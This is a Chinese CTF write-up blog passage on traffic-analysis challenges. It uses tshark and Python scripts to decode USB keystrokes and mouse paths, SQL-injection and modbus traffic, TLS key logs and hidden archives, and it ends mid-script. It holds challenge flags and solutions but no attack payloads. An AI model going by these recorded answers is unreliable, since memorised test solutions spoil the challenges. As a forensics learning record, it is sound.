+<h2 id="NSS-鹤城杯-2021-流量分析"><a href="#NSS-鹤城杯-2021-流量分析" class="headerlink" title="NSS - [鹤城杯 2021]流量分析"></a>NSS - [鹤城杯 2021]流量分析</h2><p>打开wireshark，看到是sql注入的信息，这题我熟，刚做过。就去用tshark了，但是看了眼wp，直接在这个导出页面找就行！</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-00.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">119</span>,<span class="number">49</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">75</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">122</span>,<span class="number">95</span>,<span class="number">49</span>,<span class="number">115</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">125</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">59</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    result += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag : &quot;</span> + result)</span><br></pre></td></tr></table></figure>
+
+<h2 id="USB流量-键盘流量"><a href="#USB流量-键盘流量" class="headerlink" title="USB流量 - 键盘流量"></a>USB流量 - 键盘流量</h2><p><a target="_blank" rel="noopener" href="https://wuyong.lanzout.com/ihBPQ0uug8id">附件</a>            <a target="_blank" rel="noopener" href="https://blog.csdn.net/ON_Zero/article/details/130528679">参考</a></p>
+<p>用tshark获取其中的数据</p>
+<p><code>tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
+<p>-&gt; -r 是要解析的文件名</p>
+<p>-&gt; -T 是选择以什么形式输出  &#x3D;&gt; fields 以字段形式输出，意味着只显示捕获数据中的特定字段，而不是整个数据包</p>
+<p>-&gt; -e usb.capdata 告诉tshark输出与USB相关的数据，</p>
+<p>-&gt; | 这是一个管道符，它将tshark输出传递给 sed命令</p>
+<p>-&gt; sed是流编辑器，用于处理文本流，后面这个 &#x2F;^\s*$&#x2F;d 是正则表达式，删除所有空行</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-00.png"></p>
+<p>将获取到的数据没两个之间用:隔开</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给每一行的数据 俩俩 用冒号隔开</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\CTF\\Misc流量\\键盘\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取每一行 进行去空，</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        a[i] = a[i].strip()</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">        <span class="comment"># if a[i]:</span></span><br><span class="line">            <span class="comment"># print(len(a[i]))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a[i]) == <span class="number">16</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;[*] Success &#123;i&#125;&quot;)</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a[i]), <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> j+<span class="number">2</span> != <span class="built_in">len</span>(a[i]):</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>] + <span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out += a[i][j] + a[i][j+<span class="number">1</span>]</span><br><span class="line">            f1.write(out)</span><br><span class="line">            f1.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>将文中的数据还原成键位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最后用脚本提取  键盘数据 -&gt; 字符</span></span><br><span class="line">   <span class="comment"># print((line[6:8])) #输出6到8之间的值</span></span><br><span class="line">   <span class="comment">#取出6到8之间的值</span></span><br><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\键盘\\out.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)) </span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-01.png"></p>
+<blockquote>
+<p>flag{7200[DEL]53[DEL]93}</p>
+</blockquote>
+<h2 id="USB流量-鼠标数量"><a href="#USB流量-鼠标数量" class="headerlink" title="USB流量 - 鼠标数量"></a>USB流量 - 鼠标数量</h2><p>先用tshark获取</p>
+<p><code>tshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
+<p>将数据通过：分隔开</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将上面的文件用脚本分隔，加上冒号；</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  a=f.readline().strip()</span><br><span class="line">  <span class="keyword">if</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:<span class="comment">#键盘流量的话len为16鼠标为8 </span></span><br><span class="line">      out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>] </span><br><span class="line">      f1.write(out) </span><br><span class="line">      f1.write(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    <span class="keyword">break</span> </span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
+
+<p>通过脚本转换成图片</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2000</span>,<span class="number">2000</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))<span class="comment">#创建Image对象</span></span><br><span class="line">f =<span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\Misc流量\鼠标\out1.txt&quot;</span>)<span class="comment">#xy.txt文件 </span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point =line.split()</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(point[<span class="number">0</span>]),<span class="built_in">int</span>(point[<span class="number">1</span>])),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#读取文件中的每一行，并修改像素 </span></span><br><span class="line">f.close() </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-02.png"></p>
+<p>还可以通过gnuplot软件来生成图形，（windows和linux均可，都可以下载）</p>
+<p>我是在windows下安装的，是个 exe软件，打开之后 </p>
+<p>plot ‘filepath’</p>
+<p>我是直接放在当前目录了 </p>
+<p>生成之后用画图软件翻转一下即可</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-03.png"></p>
+<hr>
+<h2 id="Buu-TLS流量分析"><a href="#Buu-TLS流量分析" class="headerlink" title="Buu - TLS流量分析"></a>Buu - TLS流量分析</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32059190">了解学习OSI模型TCP&#x2F;IP模型</a>      <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c793a279f698">了解学习OSI模型TCP&#x2F;IP模型</a></p>
+<p><a href="SSL/TLS%E4%BC%9A%E8%AF%9D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">学习 SSL&#x2F;TLS会话流量分析</a></p>
+<p>过滤http流量</p>
+<p>发现有个数据包中有个log文件</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-00.png"></p>
+<p>保存到本地为1.log，然后导入TLS的秘钥中</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-01.png"></p>
+<p>再过滤http流量，发现多了一些流量，然后其中有一个保存有flag</p>
+<h2 id="Buu-神比流量"><a href="#Buu-神比流量" class="headerlink" title="Buu - 神比流量"></a>Buu - 神比流量</h2><p>用Wireshark打开发现是USB数据；其中有一个数据包隐藏了7z文件</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-03.png"></p>
+<p>选中 as a Hex Stream &#x3D;&gt; 在记事本中粘贴看看有没有问题</p>
+<p>从37 7a开始选中，用脚本写入到.7z文件中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&#x27;377abcaf271c00044aaed88750000000000000006a000000000000002d108d3939dc5abb57f2606b99b18fb7518aa378d2dcfed3f7a197d4e752b6156b026bf975d5fa5c37618bdfe2c567592e7128e139c1a6ac4e9eed598dd3398c03c16a35502e827004852aae6a7342214fa901c30104060001095000070b0100022406f107010a5307ef3e981518c6bd122121010001000c4a4600080a011a4cdb8a00000501190900000000000000000011130066006c00610067002e0074007800740000001900140a010066629f3bc46cd801150601002000000000000600313233343536&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\flag.7z&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure>
+
+<p>得到7z文件，发现其中的文件需要解密，用010打开7z文件，文末藏有密码123456</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-02.png"></p>
+<p>打开flag.txt文件，是一个谷歌云盘的下载地址，下载下来之后，依然是一个压缩包（main.exe文件 和 out.txt文件），密码尝试一下123456成功</p>
+<p>接下来不会了。看官方Wp（需要逆向分析exe文件 是进行了Xor运算）</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2088394">官方Wp</a></p>
+<h2 id="NSSCTF-NISACTF-2022-流量包里有个熊"><a href="#NSSCTF-NISACTF-2022-流量包里有个熊" class="headerlink" title="NSSCTF - [NISACTF 2022]流量包里有个熊"></a>NSSCTF - [NISACTF 2022]流量包里有个熊</h2><p>用wireshark打开，发现有个jpg图片</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-02.png"></p>
+<p>将值弄出来放在文本中，用脚本写到图片中 [ 我不会直接将其复制在010中 ]</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这里的hexdata太长了，就不粘贴了</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\\OneDrive\\桌面\\test.jpg&#x27;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata)) <span class="comment"># unhexlify将十六进制数据转换为二进制数据</span></span><br></pre></td></tr></table></figure>
+
+<p>然后对图片binwalk分离一下</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-03.png"></p>
+<p>一个压缩包，一个flag.txt，一个图片</p>
+<p>肯定先看flag，是base64加密，解密一下发现是假的</p>
+<p>然后打开压缩包</p>
+<p>最后发现了最后一个flag.txt文件，但是里面的数据看不懂，</p>
+<p>看Wp说是加密，移位的加密 rot位移密码（rot5 rot13 rot18 rot47）</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-04.png"></p>
+<p><a target="_blank" rel="noopener" href="https://lzltool.cn/Tools/Rot13">先将txt文本中的内容进行rot13解密</a></p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-05.png"></p>
+<p>然后就是使用刚开始的脚本将这段数据写在jpg中 [ 开头是ff d8 ff ]</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;filepath&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure>
+
+<p>得到的图片是有盲水印的</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-06.png"></p>
+<p>看不清.</p>
+<h2 id="NSSCTF-CISCN-2023-初赛-被加密的生产流量"><a href="#NSSCTF-CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="NSSCTF - [CISCN 2023 初赛]被加密的生产流量"></a>NSSCTF - [CISCN 2023 初赛]被加密的生产流量</h2><p>用wireshark打开之后，发现有很多的modbus流量，且文件名就是modbus，很显然，追踪一下这个，看到了一些两个为一组的字符，题目中也提醒了是被加密的。想到了base加密</p>
+<p>这个题的加密部分不多，手动复制粘贴即可，下面这个脚本（看Wp看到的）算是一个模板，如果以后碰到了特别多的，无法手动的，分析一下加密字符所在位置，用脚本提取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">cap = pyshark.FileCapture(input_file=<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\modbus.pcap&quot;</span>,tshark_path=<span class="string">&#x27;F:\\ctf\wireshark\\tshark&#x27;</span>,display_filter=<span class="string">&#x27;modbus  &amp;&amp; frame.len == 66&#x27;</span>)</span><br><span class="line"><span class="comment"># input_file 是流量的文件路径，tshark_path是tshark软件在的位置，一般是在WireShark命令下</span></span><br><span class="line"><span class="comment"># 后面的 display_filter 把它看做是wireshark中的过滤器。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2str</span>(<span class="params"><span class="built_in">id</span>:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">id</span>)).replace(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> cap:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p.modbus.word_cnt) == <span class="number">5</span>: <span class="comment"># 我起初也没懂这个 word_cnt 打开流量包，发现是一个参数，为什么要等于5？ 因为加密的字符显示出来的十六进制数据是5位</span></span><br><span class="line">            tmp = p.modbus.word_cnt</span><br><span class="line">            tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(p.modbus.word_cnt))).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            flag = flag + tmp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">flag = hex2str(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-01.png"></p>
+<h2 id="NSSCTF-HGAME-2022-week1-好康的流量"><a href="#NSSCTF-HGAME-2022-week1-好康的流量" class="headerlink" title="NSSCTF - [HGAME 2022 week1]好康的流量"></a>NSSCTF - [HGAME 2022 week1]好康的流量</h2><p>wireshark打开，发现是SMTP和TCP协议，百度了一下啊</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-00.png"></p>
+<blockquote>
+<p>说明是发送了邮件</p>
+</blockquote>
+<p>就随便找，追踪TCP流时发现有base64加密的特征。</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-01.png"></p>
+<blockquote>
+<p>为什么会发现是base64加密？</p>
+</blockquote>
+<p>-&gt; 自己做的时候就直觉，写payload复现的时候发现有告诉是base64加密（追踪TCP流的页面）</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-02.png"></p>
+<p>告诉我们了这是png图片， &#x3D;&gt; base64解码成图片</p>
+<p><a target="_blank" rel="noopener" href="https://www.toolnb.com/tools/base64ToImages.html">在线解码网站</a></p>
+<p>接下来就是对图片的分析，我是先用虚拟机进行了foremost和binwalk 无果</p>
+<p>然后就是用了StegSolve，但是我没发现什么（就几个选项过了一遍，没发现）</p>
+<p>-&gt; 然后去看Wp了，一个是 Green通道2有条码</p>
+<p>-&gt;LSB其实在base64解码的时候算是提醒了（但是我不会调参数）</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-03.png"></p>
+<p><a target="_blank" rel="noopener" href="https://tuzim.net/decode/">解条码网站</a></p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-04.png"></p>
+<p>两半flag拼接 <code>hgame&#123;ez_1mg_Steg4n0graphy&#125;</code></p>
+<h2 id="攻防世界-流量分析1"><a href="#攻防世界-流量分析1" class="headerlink" title="攻防世界 - 流量分析1"></a>攻防世界 - 流量分析1</h2><p>下载<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/file/task/52ca22d3-4482-47ec-b6ae-7b702d1594e9.zip">附件</a>，用wireshark打开，发现是关于gopher协议配合上的sql注入（gopher应该是ssrf，我光知道这个打redis什么的，没见过利用它写sql注入的），sql语句经过了两次url编码，解码之后发现是 时间盲注（sleep）</p>
+<p>用tshark提取sql语句</p>
+<p><code>tshark -r challenge.pcapng -T fields -Y &quot;http.request.method==GET&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
+<p>-&gt; 前面两三个跟这个有关的，改一下就能直接提取</p>
+<p>-&gt; 写多了，发现了 如果想要自己独立提取信息，逐级的 跟上面的<code> -e &quot;http.request.uri.query.parameter&quot;</code>我自己没独立试过，但是发现这是有技巧的，也算是记住了</p>
+<p><img src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-00.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># data.txt的信息是经过二次url编码的，通过这个脚本提取解码后的信息</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\out.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">lines = f1.readlines()</span><br><span class="line"><span class="built_in">print</span>(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines)):</span><br><span class="line">    <span class="built_in">print</span>(lines[i])</span><br><span class="line">    <span class="built_in">str</span> = 